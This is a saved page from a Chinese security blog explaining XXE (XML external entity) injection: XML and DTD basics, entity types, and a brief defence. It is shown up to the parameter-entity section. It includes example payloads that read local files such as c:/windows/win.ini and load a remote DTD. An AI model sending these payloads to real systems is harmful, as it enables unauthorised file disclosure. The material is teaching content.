<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>XXE漏洞原理及利用 | Zephyr&#39;s Repository</title>
    <meta name="generator" content="VuePress 1.9.5">
    <link rel="icon" href="/img/favicon.ico">
    <meta name="description" content="Repository">
    <meta name="keywords" content="Personal blog">
    <meta name="theme-color" content="#11a8cd">
    
    <link rel="preload" href="/assets/css/0.styles.2ceecd60.css" as="style"><link rel="preload" href="/assets/js/app.d666345c.js" as="script"><link rel="preload" href="/assets/js/2.2caa9fc9.js" as="script"><link rel="preload" href="/assets/js/88.23a1baf9.js" as="script"><link rel="prefetch" href="/assets/js/10.92253112.js"><link rel="prefetch" href="/assets/js/100.6b2ae977.js"><link rel="prefetch" href="/assets/js/101.aacea51d.js"><link rel="prefetch" href="/assets/js/102.174cc836.js"><link rel="prefetch" href="/assets/js/103.ff1ebaa1.js"><link rel="prefetch" href="/assets/js/104.69cf1cf6.js"><link rel="prefetch" href="/assets/js/105.9594a7fc.js"><link rel="prefetch" href="/assets/js/106.99a74775.js"><link rel="prefetch" href="/assets/js/107.8f78b1ec.js"><link rel="prefetch" href="/assets/js/108.c24a6aa0.js"><link rel="prefetch" href="/assets/js/109.b7acd6b5.js"><link rel="prefetch" href="/assets/js/11.8fa5d5cf.js"><link rel="prefetch" href="/assets/js/110.2c0dad37.js"><link rel="prefetch" href="/assets/js/111.0fe328f6.js"><link rel="prefetch" href="/assets/js/12.72be6f01.js"><link rel="prefetch" href="/assets/js/13.ff9c04cb.js"><link rel="prefetch" href="/assets/js/14.96414c99.js"><link rel="prefetch" href="/assets/js/15.1e9eb50e.js"><link rel="prefetch" href="/assets/js/16.e1e06856.js"><link rel="prefetch" href="/assets/js/17.0278769e.js"><link rel="prefetch" href="/assets/js/18.bb972816.js"><link rel="prefetch" href="/assets/js/19.79cd2b85.js"><link rel="prefetch" href="/assets/js/20.7fb5caaa.js"><link rel="prefetch" href="/assets/js/21.88af962e.js"><link rel="prefetch" href="/assets/js/22.31db3d38.js"><link rel="prefetch" href="/assets/js/23.a5f143ad.js"><link rel="prefetch" href="/assets/js/24.8710ce7b.js"><link rel="prefetch" href="/assets/js/25.b8c57ad3.js"><link rel="prefetch" href="/assets/js/26.c2316678.js"><link rel="prefetch" href="/assets/js/27.21bfe439.js"><link rel="prefetch" href="/assets/js/28.96768776.js"><link rel="prefetch" href="/assets/js/29.61870f84.js"><link rel="prefetch" href="/assets/js/3.9154aee4.js"><link rel="prefetch" href="/assets/js/30.9804accb.js"><link rel="prefetch" href="/assets/js/31.1a0d56cd.js"><link rel="prefetch" href="/assets/js/32.e58ac650.js"><link rel="prefetch" href="/assets/js/33.45642796.js"><link rel="prefetch" href="/assets/js/34.64cc442a.js"><link rel="prefetch" href="/assets/js/35.618d79bb.js"><link rel="prefetch" href="/assets/js/36.01777eb4.js"><link rel="prefetch" href="/assets/js/37.13567851.js"><link rel="prefetch" href="/assets/js/38.357bc63e.js"><link rel="prefetch" href="/assets/js/39.4e1b9673.js"><link rel="prefetch" href="/assets/js/4.d29e359d.js"><link rel="prefetch" href="/assets/js/40.86012f62.js"><link rel="prefetch" href="/assets/js/41.38072a3c.js"><link rel="prefetch" href="/assets/js/42.fcacbd34.js"><link rel="prefetch" href="/assets/js/43.9a17609e.js"><link rel="prefetch" href="/assets/js/44.24b6f963.js"><link rel="prefetch" href="/assets/js/45.08f58277.js"><link rel="prefetch" href="/assets/js/46.1e9937f1.js"><link rel="prefetch" href="/assets/js/47.4346f70c.js"><link rel="prefetch" href="/assets/js/48.666ffad3.js"><link rel="prefetch" href="/assets/js/49.f71696c0.js"><link rel="prefetch" href="/assets/js/5.88d932c8.js"><link rel="prefetch" href="/assets/js/50.f6a0b6cc.js"><link rel="prefetch" href="/assets/js/51.e9183b21.js"><link rel="prefetch" href="/assets/js/52.9613803c.js"><link rel="prefetch" href="/assets/js/53.84e49fd8.js"><link rel="prefetch" href="/assets/js/54.27481140.js"><link rel="prefetch" href="/assets/js/55.c54d404d.js"><link rel="prefetch" href="/assets/js/56.9b4cfda1.js"><link rel="prefetch" href="/assets/js/57.9cc88303.js"><link rel="prefetch" href="/assets/js/58.b93735fe.js"><link rel="prefetch" href="/assets/js/59.fb6687b9.js"><link rel="prefetch" href="/assets/js/6.64c53d2e.js"><link rel="prefetch" href="/assets/js/60.d8c853ad.js"><link rel="prefetch" href="/assets/js/61.3181365c.js"><link rel="prefetch" href="/assets/js/62.f80f35d7.js"><link rel="prefetch" href="/assets/js/63.298c8979.js"><link rel="prefetch" href="/assets/js/64.0172751d.js"><link rel="prefetch" href="/assets/js/65.279a288b.js"><link rel="prefetch" href="/assets/js/66.ea6dbf7d.js"><link rel="prefetch" href="/assets/js/67.3c2ccb8c.js"><link rel="prefetch" href="/assets/js/68.70c6a2a6.js"><link rel="prefetch" href="/assets/js/69.1a64a917.js"><link rel="prefetch" href="/assets/js/7.ea40bec5.js"><link rel="prefetch" href="/assets/js/70.0f03e3cf.js"><link rel="prefetch" href="/assets/js/71.db8f5035.js"><link rel="prefetch" href="/assets/js/72.8b671082.js"><link rel="prefetch" href="/assets/js/73.989a9a9a.js"><link rel="prefetch" href="/assets/js/74.7dbf53ff.js"><link rel="prefetch" href="/assets/js/75.fdc863e8.js"><link rel="prefetch" href="/assets/js/76.8335c5ef.js"><link rel="prefetch" href="/assets/js/77.dff2cd27.js"><link rel="prefetch" href="/assets/js/78.20d1110f.js"><link rel="prefetch" href="/assets/js/79.da829f37.js"><link rel="prefetch" href="/assets/js/8.a8e385a7.js"><link rel="prefetch" href="/assets/js/80.38b5183d.js"><link rel="prefetch" href="/assets/js/81.31779399.js"><link rel="prefetch" href="/assets/js/82.9ab0f199.js"><link rel="prefetch" href="/assets/js/83.11386321.js"><link rel="prefetch" href="/assets/js/84.b40c9cc1.js"><link rel="prefetch" href="/assets/js/85.3dd4c8d9.js"><link rel="prefetch" href="/assets/js/86.eef59cd4.js"><link rel="prefetch" href="/assets/js/87.54f35730.js"><link rel="prefetch" href="/assets/js/89.e0269eb9.js"><link rel="prefetch" href="/assets/js/9.bc75a509.js"><link rel="prefetch" href="/assets/js/90.ba9d185a.js"><link rel="prefetch" href="/assets/js/91.407950b3.js"><link rel="prefetch" href="/assets/js/92.c8d2a800.js"><link rel="prefetch" href="/assets/js/93.55f6068b.js"><link rel="prefetch" href="/assets/js/94.fc44432d.js"><link rel="prefetch" href="/assets/js/95.cbc9e839.js"><link rel="prefetch" href="/assets/js/96.3f99bde9.js"><link rel="prefetch" href="/assets/js/97.5acc4bc2.js"><link rel="prefetch" href="/assets/js/98.31446065.js"><link rel="prefetch" href="/assets/js/99.2a27e19f.js">
    <link rel="stylesheet" href="/assets/css/0.styles.2ceecd60.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open have-rightmenu"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/logo.png" alt="Zephyr's Repository" class="logo"> <span class="site-name can-hide">Zephyr's Repository</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/course/" class="nav-link">笔记</a></div><div class="nav-item"><a href="/technology/" class="nav-link">技术</a></div><div class="nav-item"><a href="/more/" class="nav-link">更多</a></div><div class="nav-item"><a href="/favorites/" class="nav-link">收藏</a></div><div class="nav-item"><a href="/about/" class="nav-link">关于</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="索引" class="dropdown-title"><a href="/archives/" class="link-title">索引</a> <span class="title" style="display:none;">索引</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">📂 分类</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">🏷️ 标签</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">📅 归档</a></li></ul></div></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <div class="sidebar-hover-trigger"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="/img/Zephyr.jpg"> <div class="blogger-info"><h3>Zephyr</h3> <span>偷得浮生半日闲</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/course/" class="nav-link">笔记</a></div><div class="nav-item"><a href="/technology/" class="nav-link">技术</a></div><div class="nav-item"><a href="/more/" class="nav-link">更多</a></div><div class="nav-item"><a href="/favorites/" class="nav-link">收藏</a></div><div class="nav-item"><a href="/about/" class="nav-link">关于</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="索引" class="dropdown-title"><a href="/archives/" class="link-title">索引</a> <span class="title" style="display:none;">索引</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">📂 分类</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">🏷️ 标签</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">📅 归档</a></li></ul></div></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>Web</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/pages/2e1547494524d1be/" class="sidebar-link">SQL注入</a></li><li><a href="/pages/2e1547494524d1bf/" class="sidebar-link">PHP伪协议</a></li><li><a href="/pages/2e1547494524d1d0/" class="sidebar-link">PHP反序列化</a></li><li><a href="/pages/2e1547494524d1c0/" class="sidebar-link">SSTI模板注入</a></li><li><a href="/pages/2e1547494524d1cb/" class="sidebar-link">.htaccess文件利用</a></li><li><a href="/pages/2e1547494524d1c7/" class="sidebar-link">.user.ini文件利用</a></li><li><a href="/pages/2e1547494524d1cd/" class="sidebar-link">escapeshellarg+escapeshellcmd</a></li><li><a href="/pages/2e1547494524d1ce/" aria-current="page" class="active sidebar-link">XXE漏洞原理及利用</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1ce/#概述" class="sidebar-link">概述</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1ce/#xml基础知识" class="sidebar-link">XML基础知识</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header level3"><a href="/pages/2e1547494524d1ce/#xml基本结构" class="sidebar-link">XML基本结构</a></li><li class="sidebar-sub-header level3"><a href="/pages/2e1547494524d1ce/#两种外部文档说明-dtd" class="sidebar-link">两种外部文档说明（DTD）</a></li><li class="sidebar-sub-header level3"><a href="/pages/2e1547494524d1ce/#四种实体声明-entity" class="sidebar-link">四种实体声明（ENTITY）</a></li></ul></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1ce/#xxe漏洞" class="sidebar-link">XXE漏洞</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header level3"><a href="/pages/2e1547494524d1ce/#基础知识" class="sidebar-link">基础知识</a></li><li class="sidebar-sub-header level3"><a href="/pages/2e1547494524d1ce/#重点" class="sidebar-link">重点</a></li><li class="sidebar-sub-header level4"><a href="/pages/2e1547494524d1ce/#重点一" class="sidebar-link">重点一：</a></li><li class="sidebar-sub-header level4"><a href="/pages/2e1547494524d1ce/#重点二" class="sidebar-link">重点二：</a></li><li class="sidebar-sub-header level3"><a href="/pages/2e1547494524d1ce/#能做什么" class="sidebar-link">能做什么</a></li><li class="sidebar-sub-header level3"><a href="/pages/2e1547494524d1ce/#实例一-读本地敏感文件-有回显" class="sidebar-link">实例一：读本地敏感文件（有回显）</a></li><li class="sidebar-sub-header level4"><a href="/pages/2e1547494524d1ce/#新的问题出现" class="sidebar-link">新的问题出现</a></li><li class="sidebar-sub-header level4"><a href="/pages/2e1547494524d1ce/#新的解决方法" class="sidebar-link">新的解决方法</a></li><li class="sidebar-sub-header level3"><a href="/pages/2e1547494524d1ce/#实例二-无回显读取本地敏感文件-blind-oob-xxe" class="sidebar-link">实例二：无回显读取本地敏感文件(Blind OOB XXE)</a></li><li class="sidebar-sub-header level4"><a href="/pages/2e1547494524d1ce/#新的思考" class="sidebar-link">新的思考</a></li><li class="sidebar-sub-header level3"><a href="/pages/2e1547494524d1ce/#实例三-内网主机探测" class="sidebar-link">实例三：内网主机探测</a></li><li class="sidebar-sub-header level3"><a href="/pages/2e1547494524d1ce/#实例四-内网主机端口探测" class="sidebar-link">实例四：内网主机端口探测</a></li></ul></li></ul></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>密码学</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>技术文档</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>资料</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>博客搭建</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>GitHub技巧</span> <span class="arrow right"></span></p> <!----></section></li></ul> <div class="sidebar-slot sidebar-slot-bottom"><!-- 正方形 -->
      <ins class="adsbygoogle"
          style="display:block"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="3508773082"
          data-ad-format="auto"
          data-full-width-responsive="true"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script></div></aside> <div><main class="page"><div class="theme-vdoing-wrapper "><div class="articleInfo-wrap" data-v-06225672><div class="articleInfo" data-v-06225672><ul class="breadcrumbs" data-v-06225672><li data-v-06225672><a href="/" title="首页" class="iconfont icon-home router-link-active" data-v-06225672></a></li> <li data-v-06225672><a href="/technology/#技术" data-v-06225672>技术</a></li><li data-v-06225672><a href="/technology/#Web" data-v-06225672>Web</a></li></ul> <div class="info" data-v-06225672><div title="作者" class="author iconfont icon-touxiang" data-v-06225672><a href="javascript:;" data-v-06225672>转载</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-06225672><a href="javascript:;" data-v-06225672>2022-07-20</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-title">目录</div> <div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABH1JREFUSA3tVl1oHFUUPmdmd2ltklqbpJDiNnXFmgbFktho7YMPNiJSSZM0+CAYSkUELVhM6YuwIPpgoOKDqOBDC0XE2CQoNtQXBUFTTcCi+Wlh1V2TQExsUzcltd3M9Tt3ZjZzZ2fT+OJTL8yeM+eee757fmeJbq//KQL8X3DUSFOcfr7cRsRtxNQMWueeVzOkaITIGqQHNg5y8+jNW9ldM7A6nTpAjuolUikAwq7CE3WcM2RRDz+XGVgN3FptU/aUSlvq9Pa3iZ1+sgAqJyyAFqkipd9dqiwHF3P65YycLWc/6sqGrvoEoIp6DOFaX5h6+dnfjkWprwqsPk0dUGq5vySwDImC10KxFHgGL1SWoc92O3eVht09qdXNH11I2SsTsJYqMWzihqGMi+A+Garf3BAuuLI5oGlULyNfyB/HYNujwktOfRrMr5t77NmevqaUopx0grnKAyvVpmwUDB4x6FPXuGvYLTDwWsejwgtgkYKPqRJg8SV6xaiZ3ZTppGneS4yfH5/66fZSDHv+QZci/+h5c5UHtpy67JUqGppM0sh0Nc1dW6/N1W5Yoqat8/TU/VnadmdeW2PLLSyh0cvxBs3KbqTmwYPpxN4do/mzE8nEpvX/UMu2Wbp74zUAK5q6WkHns7V0eWkdPbPzd3rxkTGybadYySumVzhcaJFbs5UrEkQ/+CK8gF5dnh/6ciIZ73gwQ927L1IitoxKLXYP3SjYdOrHHfTZhRRlFyrorafPk20B3HPD1y2G3qKZME5Jcf3t/HUC13/8tSd++vqFveMUTwAUxSUFI1QekR1+bIze3D9MF2aq6cPvG72CgnldWCFqyRw3lwH8ZMerjTD9ElRO7Gv44wNpC90aASqGfVlz/Rx17srQ57/UU26hkhQqUB7dBR71WmzQhHUnblGmVOEw0jhbV1n9OlXUDCIRGaNV5Jp43N516fN7JmnTHdfp7Hgy0luO4aMhtkLL8Bi3bUWYvzh5Mn1dTxrL6QmGuRhGL/TiTTxRoEdTszSaq9GR0NGA3KdkOz3hqSV3MIDhQ5IVX/Ivx3umBti2es2h4eZby7x8br1rkf7Mo90AqC8aQ3sJeNzqFRu+vSANAQe3PL7l0HGOAdwDCeZYvNKeoZp1Qfs6Aipndh86HmFRi0LAnEO47wsqM6cdfjh3jBPUzhZy7nvlUfFsamED1VQt6aISHVymXZ/B2aCtIG8AI8xfobj2d3en1wWVhOeHELKmLQ1s211s88comkv4UCwWyF787mJdYXtNfhKAXVqnKTq8QZvGAGGOfaTo5pGZ/PwbUCr5+DPr/1J92JNHr9aOl/F3iI5+O1nfybsGxoimvZ3ViWSluDITw3P37mypheDIPY0tw7+O/5ApbkYw+zpfaUVu32Pi98+defdUhEpZkRFq0aqyNh9FuL9hpYbEm6iwi0z2REd09ZmyENEbuhjDWzKvZXTqKYaBIr3tt5kuPtQBZFvEUwHt60vfCNu41XsksH9Ij1BMMz1Y0OOunHNShFIP5868g5zeXmuLwL9T4b6Q2+KejgAAAABJRU5ErkJggg==">XXE漏洞原理及利用<!----></h1> <div class="page-slot page-slot-top"><!-- 固定100% * 90px可显示，max-height:90px未见显示-->
     <ins class="adsbygoogle"
          style="display:inline-block;width:100%;max-height:90px"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="6625304284"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script></div> <div class="theme-vdoing-content content__default"><h1 id="xxe漏洞原理及利用"><a href="#xxe漏洞原理及利用" class="header-anchor">#</a> XXE漏洞原理及利用</h1> <h2 id="概述"><a href="#概述" class="header-anchor">#</a> 概述</h2> <ul><li><p>XXE（外部实体注入）是XML注入的一种，普通的XML注入利用面比较狭窄，如果有的话也是逻辑类漏洞；XXE扩大了攻击面</p></li> <li><p>当允许引用外部实体时，就可能导致<strong>任意文件读取、系统命令执行、内网端口探测、攻击内网网站</strong>等危害</p></li> <li><p>防御方法：禁用外部实体（PHP：可以将libxml_disable_entity_loader设置为TRUE来禁用外部实体）</p></li></ul> <h2 id="xml基础知识"><a href="#xml基础知识" class="header-anchor">#</a> XML基础知识</h2> <h3 id="xml基本结构"><a href="#xml基本结构" class="header-anchor">#</a> XML基本结构</h3> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/XML1.png" alt="XML1"></p> <p>DTD 的作用：1.定义元素（其实就是对应 XML 中的标签）；2. 定义实体(对应XML 标签中的内容)</p> <p>假如 DTD 位于 XML 源文件的外部，那么可以通过引用<strong>外部文档说明</strong>的方式，效果如下：</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/XML2.png" alt="XML2"></p> <h3 id="两种外部文档说明-dtd"><a href="#两种外部文档说明-dtd" class="header-anchor">#</a> 两种外部文档说明（DTD）</h3> <ol><li><p>当引用的DTD文件是<strong>本地文件</strong>的时候，用SYSTEM标识，并写上”DTD的文件路径”，如下：</p> <div class="language-xml-dtd line-numbers-mode"><pre class="language-text"><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div></li> <li><p>如果引用的DTD文件是一个<strong>公共文件</strong>时，采用PUBLIC标识，如下:</p></li></ol> <div class="language-xml-dtd line-numbers-mode"><pre class="language-text"><code>&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文件的URL&quot;&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="四种实体声明-entity"><a href="#四种实体声明-entity" class="header-anchor">#</a> 四种实体声明（ENTITY）</h3> <ol><li><p>内部实体声明</p> <div class="language-xml-dtd line-numbers-mode"><pre class="language-text"><code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><div class="language-xml-dtd line-numbers-mode"><pre class="language-text"><code>&lt;!DOCTYPE foo [
&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe &quot;Thinking&quot;&gt;]&gt;
&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div></li> <li><p>外部实体声明</p> <div class="language-xml-dtd line-numbers-mode"><pre class="language-text"><code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><div class="language-xml-dtd line-numbers-mode"><pre class="language-text"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE copyright [
&lt;!ENTITY test SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt;]&gt;
&lt;reset&gt;
  &lt;login&gt;&amp;test;&lt;/login&gt;
  &lt;secret&gt;login&lt;/secret&gt;
&lt;/reset&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>上述两种均为引用实体，主要在<strong>XML文档中</strong>被应用，引用方式：<strong>&amp;实体名称;</strong> 末尾要带上分号，这个引用将直接转变成实体内容</p></li> <li><p>参数实体声明</p> <div class="language-xml-dtd line-numbers-mode"><pre class="language-text"><code>&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt; 
&lt;!ENTITY % 实体名称 SYSTEM &quot;URI/URL&quot;&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><div class="language-xml-dtd line-numbers-mode"><pre class="language-text"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE copyright [
&lt;!ENTITY % body SYSTEM &quot;http://www.runoob.com/entities.dtd&quot; &gt;
&lt;!ENTITY xxe &quot;%body;&quot;&gt;
]&gt;
&lt;reset&gt;
  &lt;secret&gt;login&lt;/secret&gt;
&lt;/reset&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>参数实体，被<strong>DTD文件</strong>自身使用 ，引用方式为：%实体名称。和通用实体一样，参数实体也可以外部引用</p> <p>允许<strong>包含外部实体</strong>，就可能存在XXE 攻击</p> <p>外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/XML3.png" alt="XML3"></p></li> <li><p>公共实体声明</p> <div class="language-xml-dtd line-numbers-mode"><pre class="language-text"><code>&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div></li></ol> <h2 id="xxe漏洞"><a href="#xxe漏洞" class="header-anchor">#</a> XXE漏洞</h2> <h3 id="基础知识"><a href="#基础知识" class="header-anchor">#</a> 基础知识</h3> <p><strong>示例代码：</strong></p> <div class="language-xml-dtd line-numbers-mode"><pre class="language-text"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE foo [
&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样</p> <p><strong>示例代码：</strong></p> <div class="language-xml line-numbers-mode"><pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>creds</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pass</span><span class="token punctuation">&gt;</span></span>mypass<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pass</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>creds</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 &quot;test&quot; 替换</p> <h3 id="重点"><a href="#重点" class="header-anchor">#</a> 重点</h3> <h4 id="重点一"><a href="#重点一" class="header-anchor">#</a> 重点一：</h4> <p>基础知识也提到实体分为两种，<strong>内部实体</strong>和<strong>外部实体</strong>，上面我们举的例子就是内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码：</p> <p><strong>示例代码：</strong></p> <div class="language-xml-dtd line-numbers-mode"><pre class="language-text"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE foo [
&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;
&lt;creds&gt;
    &lt;user&gt;&amp;xxe;&lt;/user&gt;
    &lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>这样对引用资源所做的任何更改都会在文档中自动更新,非常方便（<strong>方便永远是安全的敌人</strong>）</p> <p>当然，还有一种引用方式是使用 引用<strong>公用 DTD</strong> 的方法，语法如下：</p> <div class="language-xml-dtd line-numbers-mode"><pre class="language-text"><code>&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用</p> <h4 id="重点二"><a href="#重点二" class="header-anchor">#</a> 重点二：</h4> <p>我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体）</p> <ol><li><p>通用实体</p> <p>用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用</p> <p><strong>示例代码：</strong></p> <div class="language-xml-dtd line-numbers-mode"><pre class="language-text"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; ]&gt; 
&lt;updateProfile&gt;  
    &lt;firstname&gt;Joe&lt;/firstname&gt;  
    &lt;lastname&gt;&amp;file;&lt;/lastname&gt;  
    ... 
&lt;/updateProfile&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div></li> <li><p>参数实体</p> <ol><li>使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong></li> <li>只有在 DTD 文件中，参数实体的声明才能引用其他实体</li> <li>和通用实体一样，参数实体也可以外部引用</li></ol> <p><strong>示例代码：</strong></p> <div class="language-xml-dtd line-numbers-mode"><pre class="language-text"><code>&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; 
&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; 
%an-element; %remote-dtd;
